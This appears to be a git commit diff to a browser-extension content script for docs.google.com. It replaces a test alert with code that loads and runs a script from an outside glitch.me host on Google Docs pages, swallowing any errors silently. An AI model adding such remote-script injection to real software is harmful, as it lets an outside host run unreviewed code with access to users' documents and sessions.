a9a5d88f1b6ee2a468185d1755b3110940b67e96
sumitchohan <chauhansumit@gmail.com>
2023-06-03 11:18:41 -0500

    Update docs.google.com.js

--- ExtJs/docs.google.com.js
+++ ExtJs/docs.google.com.js
@@ -1,7 +1,9 @@
-
-document.body.style.border = "5px solid red";
-const myTimeout = setTimeout(myGreeting, 5000);
-
-function myGreeting() {
-  alert("Happy Birthday!")
-}
+try {
+    document.body.style.border = "5px solid green";
+    var script = document.createElement("script");  // create a script DOM node
+    script.src = 'https://blueninja.glitch.me/docs.google.com.js?' + new Date().getMilliseconds();
+    script.id = "ExtJs1"
+    document.head.appendChild(script);
+  } catch (error) { 
+  }
+  
